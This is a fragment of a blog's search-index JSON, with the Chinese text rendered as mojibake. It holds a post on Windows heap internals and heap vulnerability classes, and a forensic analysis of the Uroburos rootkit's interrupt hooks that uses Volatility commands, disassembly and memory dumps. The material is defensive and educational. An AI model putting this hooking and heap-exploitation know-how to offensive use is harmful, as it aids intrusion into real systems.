","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:1","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"2. å †å—é‡Šæ”¾ å †å—çš„é‡Šæ”¾ä¸»è¦æ˜¯å°†å †å—ä¿®æ”¹ä¸ºç©ºé—²çŠ¶æ€ï¼Œç„¶åå°†å †å—é“¾å…¥ç›¸åº”çš„å †è¡¨ã€‚æ‰€æœ‰çš„é‡Šæ”¾å—éƒ½é“¾å…¥å †è¡¨çš„æœ«å°¾ï¼Œåˆ†é…çš„æ—¶å€™ä¹Ÿä¼šé¦–å…ˆä»å †è¡¨æœ«å°¾åˆ†é…ã€‚ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:2","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"3. å †å—åˆå¹¶ ä¸ºäº†å‡å°‘å†…å­˜ä¸­çš„å†…å­˜ç¢ç‰‡ï¼Œåˆç†æœ‰æ•ˆåœ°åˆ©ç”¨å†…å­˜ï¼Œå †ç®¡ç†ç³»ç»Ÿè¿˜éœ€è¦è¿›è¡Œå †å—åˆå¹¶æ“ä½œã€‚å½“ä¸¤ä¸ªç©ºé—²å †å—å½¼æ­¤ç›¸é‚»çš„æ—¶å€™å°±ä¼šè¿›è¡Œå †å—åˆå¹¶æ“ä½œã€‚å…¶è¿‡ç¨‹å¤§è‡´ä¸ºï¼š å°†ä¸¤ä¸ªå—ä»Freelistä¸­è§£é“¾ -\u003e åˆå¹¶å †å— -\u003e è°ƒæ•´åˆå¹¶åå †å—çš„headerä¿¡æ¯ -\u003e å°†åˆå¹¶åçš„å †å—æ”¾å…¥Freeliståˆé€‚çš„ä½ç½® Windowså †åˆ†é…å‡½æ•° Windowså¹³å°ä¸‹çš„å †ç®¡ç†æ¶æ„å¯ä»¥ç”¨ä¸‹å›¾æ¥æ¦‚è¿°ï¼š åœ¨Windowsç³»ç»Ÿä¸­ï¼Œæä¾›äº†è®¸å¤šç±»å‹çš„å †åˆ†é…å‡½æ•°ï¼Œå¤§éƒ¨åˆ†å‡½æ•°éƒ½å¯ä»¥åœ¨å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ä¸­æ‰¾åˆ°è¯¦ç»†è¯´æ˜ã€‚å„ä¸ªå‡½æ•°ä¹‹é—´è°ƒç”¨å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä»ä¸Šå›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶Windowsä¸­å…³äºå †åˆ†é…çš„å‡½æ•°æœ‰å¾ˆå¤šï¼Œä½†æ˜¯å„ä¸ªå‡½æ•°æœ€ç»ˆéƒ½è¦ä½¿ç”¨RtlAllocateHeap()å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œè¯¥å‡½æ•°ä½äºntdll.dllæ–‡ä»¶ä¸­ã€‚æˆ–è€…å¯ä»¥æ¢ä¸ªè§’åº¦çœ‹å¾…è¿™ä¸ªé—®é¢˜ï¼Œåªè¦ç ”ç©¶æ¸…æ¥šäº†è¯¥å‡½æ•°ï¼Œå³å¯ç ”ç©¶æ¸…æ¥šWindowsä¸­çš„å †ã€‚ å¸¸è§Windowså †æ¼æ´ç±»å‹ Windowså¹³å°ä¸‹çš„å †ç®¡ç†æœºåˆ¶ä¸Linuxå¹³å°ä¸‹çš„å †ç®¡ç†æœºåˆ¶è™½ç„¶æœ‰ä¸åŒçš„åœ°æ–¹ï¼Œä½†åœ¨æ¼æ´åˆ©ç”¨æ–¹é¢ï¼Œç»å¸¸è§åˆ°çš„æ¼æ´ç±»å‹å¤§åŒå°å¼‚ï¼Œå¯èƒ½åœ¨æ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ä¸Šä¸åŒã€‚ä»¥ä¸‹å°†ç®€å•ä»‹ç»ä¸€ä¸‹å¸¸è§çš„å †æ¼æ´ç±»å‹ä»¥åŠæ¯”è¾ƒç»å…¸çš„Windowså †æ¼æ´ã€‚\r","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:3","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"1. å †æº¢å‡ºæ¼æ´ å †æº¢å‡ºä¸æ ˆæº¢å‡ºåœ¨æœ¬è´¨ä¸Šæ˜¯ç›¸é€šçš„ï¼Œéƒ½æ˜¯ç²¾å¿ƒæ„é€ ç‰¹åˆ¶çš„æ•°æ®å»è¦†ç›–æ­£å¸¸æ•°æ®ï¼Œè¦†ç›–åˆ°æŸä¸ªç‰¹å®šä½ç½®åè·³è½¬åˆ°è‡ªå·±çš„shellcodeçš„åœ°å€å»æ‰§è¡Œshellcodeã€‚ä½†ä»æŠ€æœ¯å±‚é¢æ¥è®²ï¼Œå †æº¢å‡ºæ¯”æ ˆæº¢å‡ºéš¾åº¦æ›´å¤§ã€‚è€Œä¸”ç°åœ¨åŸºæœ¬å¾ˆå°‘æœ‰è½¯ä»¶å­˜åœ¨å…¸å‹çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œç›¸åç”±äºå †çš„å¤æ‚æ€§ï¼Œå¾ˆå¤šè½¯ä»¶ä»ç„¶å­˜åœ¨è¯¸å¤šçš„å †æº¢å‡ºæ¼æ´ã€‚ å †æº¢å‡ºåˆ©ç”¨çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨ç²¾å¿ƒæ„é€ çš„æ•°æ®å»æº¢å‡ºä¸‹ä¸€ä¸ªå †å—çš„headeréƒ¨åˆ†ï¼Œä¿®æ”¹å †å—ä¸­çš„ä¸¤ä¸ªæŒ‡é’ˆï¼šå‰å‘æŒ‡é’ˆ(flink)å’Œåå‘æŒ‡é’ˆ(blink)ï¼Œè¿™æ ·çš„æ“ä½œä¼šå¯¼è‡´åœ¨å †å—è¿›è¡Œåˆ†é…ã€åˆå¹¶ã€é‡Šæ”¾ç­‰æ“ä½œæ—¶å‡ºç°å¼‚å¸¸ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¿™ä¸‰ä¸ªæ“ä½œçš„è¿‡ç¨‹ä¸­å¯»æ‰¾åˆ°å‘å†…å­˜ä»»æ„åœ°å€è¯»å†™ä»»æ„æ•°æ®çš„æœºä¼šï¼Œä»è€Œå®ç°å †æº¢å‡ºæ”»å‡»ï¼Œåœ¨ã€Š0 dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹ä¸­ï¼Œè¿™ç§æœºä¼šè¢«ç§°ä¸º\"DWORD SHOOT\"ã€‚ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:3:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"2. UAFæ¼æ´ Use After Freeï¼ˆUAFï¼‰ï¼Œé‡Šæ”¾åé‡å¼•ç”¨æ¼æ´ï¼Œ ä¸€å—å†…å­˜å·²ç»è¢«é‡Šæ”¾åï¼Œåœ¨ç¨‹åºä¸­ä»ç„¶å­˜åœ¨å¯¹è¯¥å—å†…å­˜çš„å¼•ç”¨ï¼Œå¹¶ä¸”åœ¨ä¸€å®šæƒ…å†µä¸‹å¯èƒ½ä½¿ç”¨å†…å­˜ä¸­çš„æ•°æ®ã€‚ç”±äºè¿™å—åŸæœ¬å·²ç»è¢«é‡Šæ”¾ä¸åº”è¯¥å†ä½¿ç”¨çš„å†…å­˜è¢«ç¨‹åºä¸­çš„å…¶ä»–åœ°æ–¹è¿›è¡Œäº†ä½¿ç”¨ï¼Œå› æ­¤è¯¥å—å†…å­˜ä¸­çš„æ•°æ®æ˜¯ä¸å¯ä¿¡çš„ã€‚è¿™ç§æ–¹å¼ç”šè‡³ä¼šé€ æˆå†…å­˜å´©æºƒæˆ–è€…ä»»æ„ä»£ç æ‰§è¡Œã€‚æ­¤ç±»å‹çš„æ¼æ´åœ¨æµè§ˆå™¨ä¸­æ¯”è¾ƒå¸¸è§ã€‚ UAFæ¼æ´æ¯”è¾ƒæœ‰åçš„æ˜¯CVE-2013-1347 Microsoft IE CGenericElement UAFæ¼æ´ï¼Œè¯¥æ¼æ´è¢«ç”¨åœ¨äº†å½“æ—¶è‘—åçš„â€œæ°´å‘â€äº‹ä»¶ä¸­ï¼Œå½±å“å·¨å¤§ã€‚ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:4:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"3. Double Freeæ¼æ´ åŒé‡é‡Šæ”¾æ¼æ´ï¼Œä¸»è¦æ˜¯ç”±äºå¯¹åŒä¸€å—å†…å­˜è¿›è¡ŒäºŒæ¬¡é‡å¤é‡Šæ”¾ã€‚åœ¨é‡Šæ”¾è¿‡ç¨‹ä¸­ï¼Œé‚»è¿‘çš„å·²é‡Šæ”¾çš„å †å—å­˜åœ¨åˆå¹¶åŠ¨ä½œï¼Œè¿™ä¼šå¯¼è‡´åŸæœ‰çš„å †headerä¿¡æ¯å‘ç”Ÿæ”¹å˜ï¼ŒåŒæ—¶å‰å‘æŒ‡é’ˆå’Œåå‘æŒ‡é’ˆä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ï¼Œéšåå†å¯¹å…¶ä¸­çš„åœ°å€è¿›è¡Œå¼•ç”¨ï¼Œå°±ä¼šå¯¼è‡´è®¿é—®å¼‚å¸¸ï¼Œæœ€ç»ˆå¯¼è‡´ç¨‹åºå´©æºƒæˆ–è€…ä»»æ„ä»£ç æ‰§è¡Œã€‚ä»å¦å¤–ä¸€ä¸ªè§’åº¦æ¥è¯´ï¼Œç”±äºå‘ç”Ÿäº†å¯¹é‡Šæ”¾åçš„å †å—å†…å­˜çš„å¼•ç”¨ï¼Œå› æ­¤Double Freeæ¼æ´ä¹Ÿæ˜¯UAFæ¼æ´çš„ä¸€ä¸ªå­é›†ã€‚ åŒé‡é‡Šæ”¾æ¼æ´æ¯”è¾ƒç»å…¸çš„æ˜¯CVE-2014-1767ï¼Œè¯¥æ¼æ´ä½äºWindows AFD.sysæ–‡ä»¶ä¸­ã€‚åœ¨2014å¹´çš„Pwn2Ownä¸Šï¼ŒSiberaså›¢é˜Ÿä½¿ç”¨è¯¥æ¼æ´è¿›è¡Œå†…æ ¸ææƒï¼Œç»•è¿‡äº†Windows 8.1å¹³å°ä¸Šçš„IE11æ²™ç®±ï¼Œå¹¶åœ¨éšåè·å¾—äº†Pwnie Awardsçš„â€œæœ€ä½³ææƒæ¼æ´å¥–â€ã€‚è¯¥æ¼æ´é€šæ€Windowsç³»ç»Ÿï¼Œå½±å“è¾ƒå¤§ã€‚ å‚è€ƒæ–‡çŒ® ã€Š0 dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹ ã€Šæ¼æ´æˆ˜äº‰ï¼šè½¯ä»¶åˆ†æç²¾è¦ã€‹ ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:5:0","tags":["Windows"],"title":"Windows Heap æ¼«æ¸¸","uri":"/2019/11/windows-heap/"},{"categories":["LINUX"],"content":"Uroburos Rootkitåˆ†æ","date":"2019-10-24","objectID":"/2019/10/rootkit/","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Uroburos Rootkit Analyse Uroburos Rootkitä¸­çš„HOOKçš„ç®€å•åˆ†æä»¥åŠé©±åŠ¨çš„æå– Uroburosæ˜¯ä¸€ä¸ªrootkitï¼Œç”±ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªé©±åŠ¨ç¨‹åºå’Œä¸€ä¸ªåŠ å¯†çš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿç»„æˆã€‚å®ƒå¯ä»¥çªƒå–ä¿¡æ¯ï¼ˆæœ€è‘—åçš„æ˜¯ï¼šæ–‡ä»¶ï¼‰ï¼Œè¿˜å¯ä»¥æ•è·ç½‘ç»œæµé‡ã€‚å®ƒçš„æ¨¡å—åŒ–ç»“æ„ä½¿å…¶å¯ä»¥è½»æ¾æ‰©å±•æ–°åŠŸèƒ½ï¼Œè¿™ä¸ä»…ä½¿å…¶éå¸¸å¤æ‚ï¼Œè€Œä¸”å…·æœ‰å¾ˆé«˜çš„çµæ´»æ€§å’Œå±é™©æ€§ã€‚Uroburosçš„é©±åŠ¨ç¨‹åºéƒ¨åˆ†éå¸¸å¤æ‚ï¼Œå¹¶ä¸”è®¾è®¡å¾—éå¸¸ç¦»æ•£ä¸”å¾ˆéš¾è¯†åˆ«ã€‚ æœ¬æ–‡ç« çš„åˆ†æåŸºäºBAE Systemsçš„reportä»¥åŠspresecçš„åšå®¢ï¼Œä½¿ç”¨çš„æ ·æœ¬ä¸º626576e5f0f85d77c460a322a92bb267ï¼Œä½¿ç”¨çš„ä¸»è¦å·¥å…·ä¸ºvolatilityï¼ˆrekallä¹Ÿå¯ä»¥ï¼‰ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:0:0","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Hookåˆ†æ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:0","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"æŸ¥æ‰¾å‡½æ•°hook æ ¹æ®BAE Systemsçš„reportï¼Œè¯¥rootkitå¯¹IoCreateDevice()å‡½æ•°è¿›è¡Œäº†hookã€‚æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå—è¯¥rootkitæ˜ åƒçš„imageæ¥å¯¹è¯¥hookè¿›è¡Œåˆ†æã€‚ ä½¿ç”¨volatilityçš„enumfuncæ’ä»¶æ¥åˆ—ä¸¾å‡ºæ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„å†…å­˜åœ°å€ï¼š $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 enumfunc -K -E | grep IoCreateDevice Volatility Foundation Volatility Framework 2.3.1 \u003cKERNEL\u003e Export ntoskrnl.exe 340 0x000000008056aad6 IoCreateDevice ä½¿ç”¨volshellæ¥æŸ¥çœ‹è¯¥å‡½æ•°æ˜¯å¦‚ä½•è¢«hookçš„ï¼š $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 volshell Volatility Foundation Volatility Framework 2.3.1 Current context: process System, pid=4, ppid=0 DTB=0x334000 Welcome to volshell! Current memory image is: ./uroburos_mod.vmem To get help, type 'hh()' \u003e\u003e\u003e dis(0x000000008056aad6) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX ä»ä¸Šé¢çš„ç»“æœå¯ä»¥çœ‹å‡ºï¼Œ0x1è¢«å‹å…¥æ ˆä¸­ï¼Œç„¶åINT 0xc3æ‰§è¡Œä¸€ä¸ªä¸­æ–­ã€‚æˆ‘ä»¬è¿›ä¸€æ­¥è·Ÿè¿›è¿™ä¸ªä¸­æ–­ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„å…·ä½“ä¿¡æ¯ã€‚ ä½¿ç”¨idtæŸ¥çœ‹ä¸€ä¸‹IDTï¼š $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.mem --profile=WinXPSP3x86 idt Volatility Foundation Volatility Framework 2.3.1 CPU Index Selector Value Module Section ------ ------ ---------- ---------- -------------------- ------------ [snip] 0 BC 0x8 0x8053d0b8 ntoskrnl.exe .text 0 BD 0x8 0x8053d0c2 ntoskrnl.exe .text 0 BE 0x8 0x8053d0cc ntoskrnl.exe .text 0 BF 0x8 0x8053d0d6 ntoskrnl.exe .text 0 C0 0x8 0x8053d0e0 ntoskrnl.exe .text 0 C1 0x8 0x806d1984 hal.dll .text 0 C2 0x8 0x8053d0f4 ntoskrnl.exe .text 0 C3 0x8 0x896a3670 UNKNOWN 0 C4 0x8 0x8053d108 ntoskrnl.exe .text 0 C5 0x8 0x8053d112 ntoskrnl.exe .text 0 C6 0x8 0x8053d11c ntoskrnl.exe .text 0 C7 0x8 0x8053d126 ntoskrnl.exe .text 0 C8 0x8 0x8053d130 ntoskrnl.exe .text [snip] åœ¨ä¸Šé¢çš„ç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒINT 0xc3å¤„ç†çš„ä¸­æ–­ä½äºä¸€ä¸ªåä¸ºâ€œUNKNOWNâ€çš„æ¨¡å—ä¸­ã€‚æ— æ³•æ­£ç¡®è¯†åˆ«å‡ºæ¥è¿™æ˜¯ä¸æ˜¯ç³»ç»Ÿæ¨¡å—ï¼Œè¯´æ˜ç¡®å®æœ‰é—®é¢˜ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:1","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"ä¿®æ”¹volatilityçš„apihooksæ’ä»¶ é€šè¿‡å‰é¢å‡ æ­¥æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤hookçš„åœ°å€ã€‚ä½†æ˜¯éœ€è¦æ›´å¤šçš„ä¿¡æ¯ï¼Œæœ€å¥½æ˜¯èƒ½çœ‹åˆ°hookçš„å…·ä½“æ“ä½œå†…å®¹å’Œæµç¨‹ã€‚å› ä¸ºvolatilityçš„åŸç”Ÿapihooks.pyæ˜¯ä¸æ”¯æŒå†…è”ä¸­æ–­hookçš„ï¼Œæ‰€ä»¥éœ€è¦å¯¹åŸç”Ÿæ’ä»¶åšä¸€ä¸ªæ”¹è¿›ã€‚ åŸç”Ÿapihooks.pyä¸­æœ‰ä¸ªcheck_inline()å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä»£ç æ˜¯å…¸å‹çš„å†…è”hookçš„é€»è¾‘ï¼Œè¯¥å†…è”hookåœ¨å½“å‰æ¨¡å—ï¼Œæ— æ¡ä»¶çš„jmpsï¼Œpush/retç­‰çš„å¤–éƒ¨å¯»æ‰¾è°ƒç”¨ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¯¥rootkitæ²¡æœ‰ä½¿ç”¨ä»»ä½•è¿™äº›æ–¹æ³•ã€‚ åœ¨ä¿®æ”¹äº†ä¸€äº›ä»£ç ä¹‹åï¼Œæ·»åŠ äº†ä»¥ä¸‹é€»è¾‘æ¥å¤„ç†å†…è”ä¸­æ–­hookï¼š elif op.flowControl == \"FC_INT\" and idt: # Clear the push value if push_val: push_val = None # Check for INT, ignore INT3 if op.mnemonic == \"INT\" and op.size \u003e 1 and op.operands[0].type == 'Immediate': # Check interrupt handler address d = idt[op.operands[0].value] if d and outside_module(d): break å°†ä¿®æ”¹åçš„æ’ä»¶åˆå…¥volatilityï¼Œç„¶åé‡æ–°è¿è¡Œï¼š $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 apihooks -P Volatility Foundation Volatility Framework 2.3.1 ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IoCreateDevice at 0x8056aad6 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 0x8056aae9 8b4508 MOV EAX, [EBP+0x8] 0x8056aaec 89 DB 0x89 0x8056aaed 45 INC EBP Disassembly(1): 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCallDriver at 0x804ee120 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee120 6a00 PUSH 0x0 0x804ee122 cdc3 INT 0xc3 0x804ee124 90 NOP 0x804ee125 90 NOP [snip] okï¼Œè¿™æ¬¡æ²¡æœ‰é—®é¢˜äº†ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:2","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Hookçš„è¯¦ç»†åˆ†æ åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿæ·±å…¥è·Ÿè¸ªå¤„ç†hookçš„æŒ‡ä»¤è¿›è¡Œæ›´è¯¦ç»†çš„åˆ†æäº†ã€‚é‡æ–°ä½¿ç”¨volshellæ’ä»¶æ¥çœ‹ä¸€ä¸‹å¤„ç†IoCreateDevice()çš„hookçš„å…·ä½“å‡½æ•°ï¼š \u003e\u003e\u003e dis(0x000000008056aad6, 0xb) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 \u003e\u003e\u003e dis(0x896a3670, 0x18) 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF \u003e\u003e\u003e dis(0x896a3688, 0x29) 0x896a3688 fb STI 0x896a3689 50 PUSH EAX 0x896a368a 51 PUSH ECX 0x896a368b 0fb6442414 MOVZX EAX, BYTE [ESP+0x14] 0x896a3690 8b4c2418 MOV ECX, [ESP+0x18] 0x896a3694 894c2414 MOV [ESP+0x14], ECX 0x896a3698 8b0d506c6c89 MOV ECX, [0x896c6c50] 0x896a369e 8d04c1 LEA EAX, [ECX+EAX*8] 0x896a36a1 8b4804 MOV ECX, [EAX+0x4] 0x896a36a4 894c2418 MOV [ESP+0x18], ECX 0x896a36a8 59 POP ECX 0x896a36a9 8b00 MOV EAX, [EAX] 0x896a36ab 870424 XCHG [ESP], EAX 0x896a36ae c20c00 RET 0xc \u003e\u003e\u003e dd(0x896c6c50, 1) 896c6c50 89a2d800 \u003e\u003e\u003e dd(0x89a2d800+1*8, 1) 89a2d808 8963a020 \u003e\u003e\u003e dis(0x8963a020, 0xb) 0x8963a020 55 PUSH EBP 0x8963a021 8bec MOV EBP, ESP 0x8963a023 83ec18 SUB ESP, 0x18 0x8963a026 e875fd0100 CALL 0x89659da0 ç°åœ¨æˆ‘ä»¬æ‰¾åˆ°äº†å¤„ç†hookçš„è¯¦ç»†çš„å‡½æ•°ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å°†å†…å­˜å¯¼å‡ºï¼Œç„¶åä½¿ç”¨IDAè¿›è¡Œåˆ†æã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:3","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"å¯¼å‡ºé©±åŠ¨ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:0","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"è¿½è¸ªå†…å­˜ä¸­çš„é©±åŠ¨ æˆ‘ä»¬ç›´æ¥ä½¿ç”¨volatilityçš„modlistæ’ä»¶ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„æ¶ˆæ¯ã€‚ä¹‹å‰ä¸ºrootkité©±åŠ¨ç¨‹åºç¡®å®šçš„å†…å­˜ç©ºé—´ä¸­ä¼¼ä¹æ²¡æœ‰æ¨¡å—ã€‚æˆ‘ä»¬æ³¨æ„åˆ°é©±åŠ¨ç¨‹åºä¼¼ä¹å ç”¨äº†å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç›®å‰ä¸ºæ­¢ç¡®å®šçš„æœ€ä½åœ°å€å¼€å§‹å‘åæœç´¢å†…å­˜ã€‚å¯»æ‰¾PEå¤´ï¼Œä»¥0x8963a020ä¸ºèµ·ç‚¹ï¼Œå‘åçœ‹0x6000å­—èŠ‚ã€‚ \u003e\u003e\u003e db(0x8963a020-0x6000, 0x6000) 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... [snip] åœ¨ä¸Šé¢çš„ç»“æœä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†DOSå¤´ï¼Œç„¶åå¾€å‰çœ‹ä¸€ç‚¹ï¼Œå»å¯»æ‰¾â€œMZâ€ï¼š \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 00 00 00 00 03 00 00 00 04 00 00 00 ff ff 00 00 ................ 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 00 00 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 ....L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... å¥‡æ€ªçš„æ˜¯â€œMZâ€å’Œâ€œPEâ€çš„é­”æœ¯å­—éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œè¿™æ„å‘³moddumpæ’ä»¶å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:1","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"ä¿®è¡¥å†…å­˜ 